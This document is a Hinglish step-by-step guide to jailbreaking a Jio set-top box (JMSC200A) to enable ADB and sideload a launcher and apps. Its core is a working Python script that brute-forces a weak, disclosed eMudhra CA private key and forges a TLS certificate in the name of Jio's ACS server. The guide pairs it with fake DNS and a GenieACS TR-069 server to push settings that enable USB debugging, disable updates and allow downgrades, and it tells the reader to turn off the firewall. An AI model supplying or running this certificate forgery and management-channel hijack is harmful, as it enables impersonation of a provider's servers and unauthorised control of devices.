# Jio STB (JHS Series / JMSC200A) — Complete Master Guide
### ADB Enable + Monet Launcher + App Install — Full Working Record

ADB Access JHS-series (JioOS 2.0) Jio STB par **already successfully ho chuka hai**. Isme har step, har command, expected output, aur jo bhi errors aaye unke fix — sab ek jagah hai. Guide follow karo.

**Aapka device:** JMSC200A / JHS series, Android 11, 32-bit

**STB IP (is setup mein):** 192.168.2.187

**PC ka LAN IP (is setup mein):** 192.168.2.202

---

## Requirements (ek baar install karna)

| Tool | Kaam | Kahan se |
|---|---|---|
| Docker Desktop | GenieACS + MongoDB backend chalata hai | docker.com |
| Python 3 | Certificate forge karne ki script chalata hai | python.org (Add to PATH tick karna) |
| Technitium DNS | Local fake DNS server | technitium.com |
| Git for Windows | Git Bash terminal deta hai | gitforwindows.org |
| Platform-Tools (ADB) | adb.exe | Android Developer site |
| sideload-jiostb repo | Poora exploit toolkit | GitHub ZIP, Downloads mein extract |

---

## PHASE 1: Network Setup (PC + STB)

### Step 1: PC ka IP Address Pata Karo
```
ipconfig
```
"Wireless LAN adapter Wi-Fi" ke neeche **IPv4 Address** likh lo (jaise `192.168.2.202`). Ye poore process mein baar-baar use hoga.

### Step 2: Windows Firewall Band Karo
`Win + R` → `firewall.cpl` → **Turn Windows Defender Firewall on or off** → Private aur Public dono **Turn Off** → OK.

**Kyun:** Firewall STB se aane wale port 53 (DNS), 8443/9443 (TLS proxy) aur 7547 (TR-069) ke traffic ko block kar deta hai.

### Step 3: PC ka IPv6 Band Karo
`Win + R` → `ncpa.cpl` → active Wi-Fi par right-click → **Properties** → **Internet Protocol Version 6 (TCP/IPv6)** ka tick hata do → OK.

**Kyun:** Agar IPv6 on raha, Windows apna fake local DNS (Technitium) chhod kar router ka IPv6 DNS use karega, jo asli Jio IP dega — fake server kaam nahi karega.

### Step 4: STB ka DNS Static Karo (USB bug tareeka)
1. Ek khali USB pendrive STB mein lagao.
2. STB boot karo → **My Music** → **Settings** → **Eject USB**.
3. **Internal Storage** → **Apps** → stock **Settings** (gear icon) kholo.
4. **Network** → apna Wi-Fi → **Advanced IP Settings**.
5. IP Settings ko **DHCP se Static** karo.
6. IP, Gateway, Subnet, DNS 2 waise hi rehne do. **DNS 1** mein apna **PC ka IPv4** (Step 1 wala) daalo.
7. Save karo.

> ⚠️ Agar Static select karte hi IP/Gateway khali ho jaye: pehle DHCP mein wapas jaakar values note karo, phir Static karke manually bhar do.

---

## PHASE 2: Python Script Bug Fix (ek baar karna hai)

Toolkit ki `forge_emudhra_chain.py` file mein bug tha jo internet se certificate download karte waqt crash ho jata tha (`AttributeError`, phir `MalformedFraming`, phir `TabError`). Ye sab theek ho chuka hai — neeche di gayi **final corrected file** use karo.

1. Folder kholo: `jhsc200-sideload-main\jhs`
2. `forge_emudhra_chain.py` par right-click → **Open with Notepad**.
3. Sab kuch select karke delete karo.
4. Neeche di gayi puri file paste karo, **Ctrl+S** se save karo.

```python
#!/usr/bin/env python3
"""
forge_emudhra_chain.py — mint a forged ACS certificate for a Jio STB.

WHY
    Jio's real ACS cert chains to their private sub-CA (RILSUBCA01 -> RILROOTCA),
    which we cannot forge. JHS-series boxes validate the chain against the system
    trust store and do NOT pin RILROOTCA, so any chain anchored on a root the box
    already trusts is accepted.

    In October 2026 eight eMudhra intermediate CA private keys were disclosed. They
    were weakly generated (P-384 scalars of 4, 56, 66, 115, 155, 156, 230, 237),
    so anyone can recompute them from the public certificate. One of those
    intermediates is cross-signed by Sectigo's "AAA Certificate Services" root,
    which is present in frozen pre-2021 trust stores -- exactly what an embedded
    box with a 2024 system image has.

WHAT IT DOES
    1. Fetches the compromised intermediate (or reads a local copy of it).
    2. Brute-forces the scalar d in 1..255 against its P-384 public key.
    3. Signs a leaf for --host with that key.
    4. Writes one PEM file: leaf + intermediate + leaf private key, which is what
       pass_front.py's ssl.SSLContext.load_cert_chain() wants.

USAGE
    pip install cryptography
    python3 jhs/forge_emudhra_chain.py
        --host NAME      subject/SAN for the leaf (default acs.oss.jio.com)
        --out PATH       output chain file (default /tmp/forged_chain.pem)
        --int-pem PATH   use a local intermediate cert instead of fetching
        --start YYYY-MM-DD  leaf notBefore (default: intermediate notBefore + 1 day)
        --end YYYY-MM-DD    leaf notAfter (default: intermediate notAfter - 1 day)

    NOTE ON DATES: keep the leaf INSIDE the intermediate's validity window. A box
    with a stale RTC (common after cold power-cycles with no NTP) rejects a leaf
    whose notBefore is in its future with SSLV3_ALERT_CERTIFICATE_EXPIRED. Widening
    the leaf to span the intermediate's whole window is what finally worked.
"""

import argparse
import datetime
import socket
import ssl
import sys

try:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.x509.oid import NameOID
except ImportError:
    sys.exit("This script needs the 'cryptography' package: pip install cryptography")

# Public test host maintained by the researchers; it serves a chain built from the
# compromised intermediate so anyone can pull it down.
TEST_HOST = "dv-g3b-aaa-emudhra.we-have-a-problem.com"
TEST_PORT = 443

# Published scalar for EM DV TLS CA - G3B. Cross-check only, not used for recovery.
EXPECTED_D = 156


def _aware(value):
    """Return a UTC-aware datetime regardless of old/new cryptography versions."""
    return value if value.tzinfo else value.replace(tzinfo=datetime.timezone.utc)


def not_before(cert):
    return _aware(getattr(cert, "not_valid_before_utc", cert.not_valid_before))


def not_after(cert):
    return _aware(getattr(cert, "not_valid_after_utc", cert.not_valid_after))


def fetch_intermediate():
    """Return the intermediate from the public test host's chain."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with ctx.wrap_socket(
        socket.create_connection((TEST_HOST, TEST_PORT), timeout=20), server_hostname=TEST_HOST
    ) as s:
        try:
            chain = s.get_verified_chain()  # Python 3.13+
        except AttributeError:
            return fetch_intermediate_openssl()
        return chain[1]


def fetch_intermediate_openssl():
    """Python < 3.13 fallback: shell out to openssl s_client -showcerts."""
    import re
    import subprocess

    cmd = [
        "openssl", "s_client",
        "-connect", f"{TEST_HOST}:{TEST_PORT}",
        "-servername", TEST_HOST,
        "-showcerts",
    ]
    try:
        out = subprocess.run(
            cmd, input="", capture_output=True, text=True, timeout=60, check=False
        ).stdout
    except FileNotFoundError:
        sys.exit(
            "This Python is too old to read the chain and 'openssl' was not found.\n"
            f"Save the intermediate manually: openssl s_client -connect {TEST_HOST}:443 "
            "-showcerts\nthen pass the second cert to --int-pem."
        )
    certs = re.findall(r"-----BEGIN CERTIFICATE-----\n.*?-----END CERTIFICATE-----", out, re.S)
    if len(certs) < 2:
        sys.exit(
            "Could not retrieve the intermediate certificate from "
            f"{TEST_HOST}:{TEST_PORT}.\nSave it manually: openssl s_client -connect "
            f"{TEST_HOST}:443 -showcerts\nthen pass the second cert to --int-pem."
        )
    return x509.load_pem_x509_certificate(certs[1].encode())


def recover_scalar(int_pub):
    """The compromised keys are scalars < 256; recover by brute force."""
    target = int_pub.public_numbers()
    for d in range(1, 256):
        cand = ec.derive_private_key(d, ec.SECP384R1()).public_key().public_numbers()
        if cand.x == target.x and cand.y == target.y:
            return d
    return None


def mint_leaf(int_cert, int_key, host, not_before, not_after):
    leaf_key = ec.generate_private_key(ec.SECP256R1())
    leaf = (
        x509.CertificateBuilder()
        .subject_name(
            x509.Name(
                [
                    x509.NameAttribute(NameOID.COUNTRY_NAME, "IN"),
                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Jio Platforms Ltd"),
                    x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "RJIL"),
                    x509.NameAttribute(NameOID.COMMON_NAME, host),
                ]
            )
        )
        .issuer_name(int_cert.subject)
        .public_key(leaf_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(not_before)
        .not_valid_after(not_after)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName(host)]), critical=False)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]), critical=False
        )
        .sign(int_key, hashes.SHA384())
    )
    return leaf, leaf_key


def main():
    ap = argparse.ArgumentParser(description="Forge an ACS cert signed by the weak eMudhra key")
    ap.add_argument("--host", default="acs.oss.jio.com")
    ap.add_argument("--out", default="/tmp/forged_chain.pem")
    ap.add_argument("--int-pem", default=None, help="local PEM of the compromised intermediate")
    ap.add_argument("--start", default=None, help="YYYY-MM-DD (default: int notBefore + 1d)")
    ap.add_argument("--end", default=None, help="YYYY-MM-DD (default: int notAfter - 1d)")
    args = ap.parse_args()

    if args.int_pem:
        int_cert = x509.load_pem_x509_certificate(open(args.int_pem, "rb").read())
    else:
        print(f"[*] fetching intermediate from {TEST_HOST}:{TEST_PORT} ...")
        int_cert = fetch_intermediate()

    # SAFELY PARSE THE CERTIFICATE WHETHER IT DOWNLOADS AS BYTES (DER/PEM) OR RETURNS AN OBJECT
    if isinstance(int_cert, bytes):
        if int_cert.startswith(b'\x30'):
            int_cert = x509.load_der_x509_certificate(int_cert)
        else:
            int_cert = x509.load_pem_x509_certificate(int_cert)

    int_nb = not_before(int_cert)
    int_na = not_after(int_cert)
    print(f"[*] intermediate : {int_cert.subject.rfc4514_string()}")
    print(f"[*] its validity : {int_nb} -> {int_na}")
    print(f"[*] its sig alg  : {int_cert.signature_algorithm_oid.dotted_string}")

    d = recover_scalar(int_cert.public_key())
    if d is None:
        sys.exit(
            "[!] scalar not found in 1..255 -- this intermediate is not one of the\n"
            "    compromised eight, or the wrong cert was pulled."
        )
    print(f"[+] RECOVERED private key: d = {d}")
    if d == EXPECTED_D:
        print(f"[+] matches the published value for EM DV TLS CA - G3B ({EXPECTED_D})")

    int_key = ec.derive_private_key(d, ec.SECP384R1())

    def parse_date(s, default):
        if not s:
            return default
        return datetime.datetime.strptime(s, "%Y-%m-%d").replace(tzinfo=datetime.timezone.utc)

    nb = parse_date(args.start, int_nb + datetime.timedelta(days=1))
    na = parse_date(args.end, int_na - datetime.timedelta(days=1))
    if not (int_nb < nb < na < int_na):
        sys.exit(
            f"[!] leaf window {nb} -> {na} is not inside the intermediate's validity.\n"
            "    Any client that checks intermediate dates will reject it."
        )

    leaf, leaf_key = mint_leaf(int_cert, int_key, args.host, nb, na)

    # Sanity-check the signature chain before handing it to a live box.
    verifier = int_cert.public_key()
    verifier.verify(
        leaf.signature, leaf.tbs_certificate_bytes, ec.ECDSA(hashes.SHA384())
    )

    lp = leaf.public_bytes(serialization.Encoding.PEM).decode()
    ip = int_cert.public_bytes(serialization.Encoding.PEM).decode()
    kp = leaf_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ).decode()

    with open(args.out, "w") as f:
        f.write(lp + ip + kp)

    print(f"[+] leaf CN={args.host} SAN={args.host} valid {nb} -> {na}")
    print(f"[+] chain written to {args.out} (leaf + intermediate + key)")
    print(f"[+] serve it with: TLS_CERT={args.out} ./jhs/run_acs.sh")
    print()
    print("Reminder: this works only because the box's trust store contains Sectigo")
    print("AAA Certificate Services and checks neither revocation nor CT. Browsers")
    print("blocklist these intermediates; embedded devices never got that update.")


if __name__ == "__main__":
    main()
```

---

## PHASE 3: Fake ACS Server Start Karo

**Dhyan rahe: is phase mein router ka internet ON hona chahiye** (certificate download karne ke liye).

### Step 5: Docker Containers Start Karo
1. Docker Desktop kholo, "Running" (green) hone ka wait karo.
2. Folder `jhsc200-sideload-main\tls` kholo, address bar mein `cmd` likh ke Enter.
3. Chalao:
```
docker-compose up -d
```
**Expected output:** pehli baar images download hongi, end mein `Started`/`Running` dikhega.

### Step 6: Technitium DNS Setup
1. Browser mein `http://localhost:5380` kholo.
2. **Zones → Add Zone**: Zone Name = `jio.com`, Type = `Primary Zone`.
3. Zone ke andar **Add Record**: Name = `acs.oss`, Type = `A`, IP = apna PC ka IPv4 (Step 1).
4. Save karo, zone Enabled honi chahiye.

### Step 7: Proxy Listener Start Karo (Window #1)
1. Main folder `jhsc200-sideload-main` mein khali jagah right-click → **Open Git Bash here**.
2. Chalao:
```
./jhs/run_acs.sh
```
**Expected output:**
```
✓ minting forged chain -> .../tls/forged_chain.pem
[*] fetching intermediate from dv-g3b-aaa-emudhra...
[+] RECOVERED private key: d = 156
[+] chain written to ... (leaf + intermediate + key)
[+] serve it with: TLS_CERT=... ./jhs/run_acs.sh
```
**Ye window band mat karo** — ye STB ka wait karegi.

---

## PHASE 4: Final Jailbreak

### Step 8: Internet Cable Nikalo (Critical)
Router ke peeche se **Fiber/WAN cable nikal do**. Router on rahega, par internet band ho jayega. STB-PC dono Wi-Fi se connected rahenge.

### Step 9: Main Script Chalao (Window #2 — nayi window)
1. Main folder mein dubara right-click → **Open Git Bash here** (dusri window).
2. Chalao:
```
./stage1.sh --list-devices
```
**Expected output (pehli baar):**
```
[1/6] Checking prerequisites...
✓ TLS front-end already listening on :8443 + :9443
[2/6] Finding device in GenieACS...
  No devices found in GenieACS.
  Note: The STB only connects on boot...
```

### Step 10: STB Cold Reboot Karo
Command chalate hi: STB ka **power plug wall se nikalo** (remote se off nahi), 5 second ruko, wapas lagao.

**Expected output (STB connect hone par):**
```
✓ Auto-selected device: 98C9BE-JMSC200A-RVVSBILB1121062
[3/6] Refreshing device data model...
✓ refreshObject (full tree) — queued for next Inform
[4/6] Queuing TR-069 tasks...
✓ Enable USB Debugging — queued for next Inform
✓ Set Debug Validity (2037) — already in queue, skipping duplicate
✓ Disable FOTA + Enable Downgrade — already in queue, skipping duplicate
```

### Step 11: ADB Connect + TV Allow
```
adb connect 192.168.2.187:5555
```
Pehli baar `failed to authenticate` aana **normal hai** — iska matlab connection ban gaya hai, bas TV par allow baaki hai.

TV screen par **"Allow USB Debugging?"** popup aayega → remote se **"Always allow from this computer"** tick karke OK.

Phir check karo:
```
adb devices
```
**Expected output:**
```
List of devices attached
192.168.2.187:5555     device
```

### Step 12: Launcher Install Karo (final command)
```
./stage1.sh --skip-prereqs --stb-ip 192.168.2.187
```
Isse Monet Launcher install hoga, stock launcher suspend hoga, boot ads band honge.

---

## PHASE 5: Cleanup (process poora hone ke baad)

1. Router mein internet/fiber cable wapas lagao.
2. Window #1 (listener) mein `Ctrl + C`.
3. Window #2 mein:
```
docker compose down
```
4. `firewall.cpl` se Windows Firewall wapas ON karo.
5. `ncpa.cpl` se IPv6 wapas ON kar sakte ho (optional).
6. Docker Desktop band kar do (system tray se Quit).

---

## PHASE 6: Monet Launcher ko Permanently Default Banana

(Agar reboot ke baad stock Jio launcher wapas aa jaye)

```
adb shell cmd package query-activities --brief -a android.intent.action.MAIN -c android.intent.category.HOME
adb shell cmd package set-home-activity com.klevico.monet/.HomeActivity
adb shell pm disable-user --user 0 com.techgenius.tvoslauncher
adb shell pm disable-user --user 0 com.jio.stb.hotellauncher
```

**Agar disable karne ke baad bhi Jio launcher wapas enable ho jaye** (Jio ki service isse wapas la rahi hoti hai), to **uninstall karo** (system image mein rehta hai, safe hai):
```
adb shell pm uninstall -k --user 0 com.iwedia.ui.rjio.launcher.reliance
adb shell cmd package set-home-activity com.klevico.monet/.HomeActivity
adb reboot
```

**Wapas lana ho kabhi:**
```
adb shell cmd package install-existing com.iwedia.ui.rjio.launcher.reliance
```

**Check karne ke commands:**
```
adb shell pm list packages -d | findstr -i launcher
adb shell pm list packages -e | findstr -i iwedia
adb shell dumpsys activity activities | findstr -i mResumedActivity
```

---

## PHASE 7: Apps (APK) Install Karna

> **Zaroori baat:** Is STB ka built-in package installer (store se "installing" par atak jaata hai) kaam nahi karta. Uptodown/Aptoide/APKMirror se store ke andar se ek-click install **nahi hoga**. Sirf ADB se install reliable hai.

### Tareeka A: PC se ADB (sabse reliable)
```
adb connect 192.168.2.187:5555
adb install -r "C:\path\to\app.apk"
```

### Tareeka B: Ek-click drag-drop tool (bina baar-baar CMD likhe)
Ye script banao: `install_apk_loop.bat`
```bat
@echo off
title APK Installer
cd /d "C:\Users\GOD\Downloads\Compressed\platform-tools-latest-windows\platform-tools"
adb connect 192.168.2.187:5555

if not "%~1"=="" (
  for %%a in (%*) do adb install -r "%%~a"
)

:loop
echo.
echo ================================================================
echo APK file(s) is window mein drag-drop karo ya path paste karo,
echo phir Enter dabao. Band karne ke liye window close kar do.
echo ================================================================
set "f="
set /p "f=> "
if not defined f goto loop
for %%a in (%f%) do adb install -r "%%~a"
goto loop
```
Double-click karo, phir koi bhi APK is window ke andar drag-drop karte raho — multiple apps ek ke baad ek install hoti rahengi, jab tak window close na karo.

### Tareeka C (STB se direct, PC ki zaroorat nahi — agar Shevery/terminal app hai)
Store (jaise Uptodown) se APK download karo, phir Shevery terminal ya `adb shell` mein:
```
cp /sdcard/Download/appname.apk /data/local/tmp/app.apk
pm install -r /data/local/tmp/app.apk
rm /data/local/tmp/app.apk
```
**Kyun seedha `/sdcard/` se install nahi hota:** `pm install` ko Android ka system_server chalata hai, jo SELinux restriction ki wajah se `/sdcard` (fuse filesystem) ki file nahi padh sakta. `/data/local/tmp/` mein copy karna padta hai.

---

## PHASE 8: ADB ko Kahin se bhi Chalana (PATH mein jodna)

Har baar platform-tools folder mein jaane se bachne ke liye:

1. Windows search → **"Edit environment variables for your account"**.
2. **User variables → Path → Edit → New**.
3. Paste karo:
```
C:\Users\GOD\Downloads\Compressed\platform-tools-latest-windows\platform-tools
```
4. OK → OK → OK. **Nayi CMD window** kholo, check karo:
```
adb version
```

> Behtar hai platform-tools folder ko `Downloads\Compressed\...` se nikal kar `C:\platform-tools` jaisi simple fixed jagah rakho, taaki kabhi move/delete hone par PATH na toote.

---

## ⚠️ Common Errors aur Unke Fix

| Error | Karan | Fix |
|---|---|---|
| `[WARN] DNS acs.oss.jio.com -> 49.40.8.93` | PC IPv6/router DNS use kar raha hai, Technitium nahi | IPv6 disable karo (`ncpa.cpl`), `ipconfig /flushdns` chalao |
| `No devices found in GenieACS` (baar baar) | STB ka time/date galat ho gaya (bina internet reboot se), ya DNS reset ho gaya | Internet on karke STB ka time theek hone do, DNS 1 wapas set karo, phir internet off karke reboot |
| `AttributeError: 'bytes' object has no attribute 'not_valid_before'` | Purani buggy script | Phase 2 ki corrected file use karo |
| `ValueError: Unable to load PEM file ... MalformedFraming` | Certificate DER format mein aaya, PEM expect ho raha tha | Phase 2 ki corrected file (dono format handle karti hai) |
| `TabError: inconsistent use of tabs and spaces` | Notepad mein code paste karte waqt indentation bigdi | Puri file ek baar mein copy-paste karo, manually edit mat karo |
| `adb connect` par `failed to authenticate` | Normal hai — TV par abhi "Allow" nahi dabaya | TV screen check karo, popup par OK/Allow karo, phir dubara `adb connect` |
| `docker-compose up -d` mein `dial tcp: lookup registry-1.docker.io: no such host` | Internet cable nikli hui thi jab Docker images download karne ki koshish hui | Internet wapas lagao, `docker-compose up -d` dubara chalao, phir internet nikalo |
| Install karte waqt store "installing" par atak jaye | STB ka system package installer Jio ne modify/restrict kar diya hai | Store se install mat karo — ADB (`adb install`) ya Shevery+`pm install` use karo |
| `INSTALL_FAILED_NO_MATCHING_ABIS` | APK 64-bit-only hai, ye STB 32-bit hai | Us app ka 32-bit (armeabi-v7a) version dhoondo |
| Home dabane par Jio ka stock launcher wapas aa jaye | Disable hone ke baad bhi Jio service use re-enable kar deti hai | `pm uninstall -k --user 0` use karo (disable nahi) |
| Reboot ke baad Shizuku/adb wireless band ho jaye | Wireless ADB aur Shizuku session reboot par reset hote hain | Har reboot ke baad `adb connect <IP>:5555` dobara chalao |

---

## Quick Reference: Sabse Zyada Use Hone Wale Commands

```
# Connect
adb connect 192.168.2.187:5555
adb devices

# Install app
adb install -r "C:\path\app.apk"

# Monet launcher default
adb shell cmd package set-home-activity com.klevico.monet/.HomeActivity

# Stock Jio launcher hatao
adb shell pm uninstall -k --user 0 com.iwedia.ui.rjio.launcher.reliance

# Reboot
adb reboot

# Storage dekho
adb shell df -h
adb shell ls -la /sdcard/Download/

# File bhejna/lena
adb push "C:\path\file" /sdcard/Download/
adb pull /sdcard/Download/file "C:\path\"
```
